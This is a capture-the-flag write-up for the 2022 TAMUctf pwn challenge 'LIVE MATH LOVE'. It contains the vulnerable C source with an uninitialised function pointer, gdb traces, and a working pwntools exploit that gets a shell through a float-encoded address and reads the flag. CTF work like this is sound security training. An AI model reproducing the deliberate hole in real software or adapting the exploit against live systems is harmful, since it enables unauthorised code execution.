# LIVE MATH LOVE

> Points: 194  
>  
> Solves: 40

## Description:  
> Author: Lane  
>  
> I made this cool calculator! Hope there's nothing vulnerable in here  
>  
> SNI: live-math-love

## Attachments:  
> live_math_love.zip  
>  
> live_math_love  
>  
> live_math_love.c  
>  
> solver-template.py

## C code:

```c  
#include <stdio.h>  
#include <stdlib.h>

void win()  {  
   system("/bin/sh");  
}

void add() {  
   float a;  
   float b;  
   scanf("%f\n", &a);  
   scanf("%f\n", &b);

   printf("%f\n", a+b);  
}

void sub() {  
   float a;  
   float b;  
   scanf("%f\n", &a);  
   scanf("%f\n", &b);

   printf("%f\n", a-b);  
}

void mult() {  
   float a;  
   float b;  
   scanf("%f\n", &a);  
   scanf("%f\n", &b);

   printf("%f\n",a*b);  
}

void menu() {  
   printf("LIVE MATH LOVE\n");  
   printf("1. Add\n");  
   printf("2. Subtract\n");  
   printf("3. Multiply\n");  
   printf("> ");

   void (*action)();  
   int choice;  
   scanf("%d\n", &choice);

   if (choice == 1) {  
       action = add;  
   } else if (choice == 2) {  
       action = sub;  
   } else if (choice == 3) {  
       action = mult;  
   }

   action();

   menu();  
}

void main() {  
   setvbuf(stdout, NULL, _IONBF, 0);  
   setvbuf(stdin, NULL, _IONBF, 0);  
   setvbuf(stderr, NULL, _IONBF, 0);

   menu();

}  
```

## Analysis:

If Action is set to anything other than 1,2,3, a Segmentation fault will occur
because the action variable is not set.  
```  
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_LIVE_MATH_LOVE$ ./live_math_love  
LIVE MATH LOVE  
1. Add  
2. Subtract  
3. Multiply  
> 4  
1  
Segmentation fault (core dumped)  
```

If we enter `1` as shown below, it will be called to `0x3f800000`.
`0x3f800000` is a floating point value of `1`.  
```c  
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_LIVE_MATH_LOVE$ gdb -q ./live_math_love  
Reading symbols from ./live_math_love...  
(No debugging symbols found in ./live_math_love)  
gdb-peda$ run  
Starting program:
/home/mito/CTF/TAMUctf_2022/Pwn_LIVE_MATH_LOVE/live_math_love  
LIVE MATH LOVE  
1. Add  
2. Subtract  
3. Multiply  
> 1  
0  
1  
0  
1.000000  
LIVE MATH LOVE  
1. Add  
2. Subtract  
3. Multiply  
> 1

Program received signal SIGSEGV, Segmentation fault.  
[----------------------------------registers-----------------------------------]  
RAX: 0x0  
RBX: 0x4013b0 (<__libc_csu_init>:       push   r15)  
RCX: 0x0  
RDX: 0x3f800000  
RSI: 0x31 ('1')  
RDI: 0x7fffffffd9b0 --> 0x7fffffff0030 --> 0x0  
RBP: 0x7fffffffdf00 --> 0x7fffffffdf20 --> 0x7fffffffdf30 --> 0x0  
RSP: 0x7fffffffdee8 --> 0x401338 (<menu+169>:   mov    eax,0x0)  
RIP: 0x3f800000  
R8 : 0x31 ('1')  
R9 : 0x0  
R10: 0x7ffff7f5cac0 --> 0x100000000  
R11: 0x246  
R12: 0x401080 (<_start>:        xor    ebp,ebp)  
R13: 0x7fffffffe020 --> 0x1  
R14: 0x0  
R15: 0x0  
EFLAGS: 0x10293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction
overflow)  
[-------------------------------------code-------------------------------------]  
Invalid $PC address: 0x3f800000  
```

We can start `/bin/sh` by typing `5.883707532277683e-39` instead of `1` above.
`5.883707532277683e-39` is the value of the floating point format
`struct.unpack('!f', '\x00\x40\x11\x62')[0]` of the address(`0x401162`) of the
win function.

```c  
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_LIVE_MATH_LOVE$ ./live_math_love  
LIVE MATH LOVE  
1. Add  
2. Subtract  
3. Multiply  
> 1  
0  
5.883707532277683e-39  
0  
0.000000  
LIVE MATH LOVE  
1. Add  
2. Subtract  
3. Multiply  
> 1  
$ $  

```

## Exploit code:  
The Exploit code is below.  
```python  
from pwn import *

context(os='linux', arch='amd64')  
#context.log_level = 'debug'

BINARY = './live_math_love'  
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':  
 s = remote("tamuctf.com", 443, ssl=True, sni="live-math-love")  
else:  
 s = process(BINARY)  
  
s.sendlineafter("> ", "1")  
s.sendline("0")  
s.sendline("5.883707532277683e-39") # struct.unpack('!f',
'\x00\x40\x11\x62')[0]  
s.sendline("0")  
s.sendlineafter("> ", "1")

s.interactive()  
```

## Results:  
The execution result is as follows.  
```bash  
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_LIVE_MATH_LOVE$ python3 solve.py r  
[*] '/home/mito/CTF/TAMUctf_2022/Pwn_LIVE_MATH_LOVE/live_math_love'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to tamuctf.com on port 443: Done  
[*] Switching to interactive mode  
$ id  
uid=0(root) gid=0(root) groups=0(root)  
$ ls -l  
total 28  
-rw-r--r-- 1 root root    77 Apr 13 04:56 docker_entrypoint.sh  
-rw-r--r-- 1 root root    20 Apr  9 22:54 flag.txt  
-rwxr-xr-x 1 root root 16904 Apr 13 04:55 live_math_love  
$ cat flag.txt  
gigem{m47h3m461c4l!}  
```

## Reference:

Original writeup
(https://github.com/mito753/CTF/blob/main/2022/TAMUctf_2022/Pwn_LIVE_MATH_LOVE/).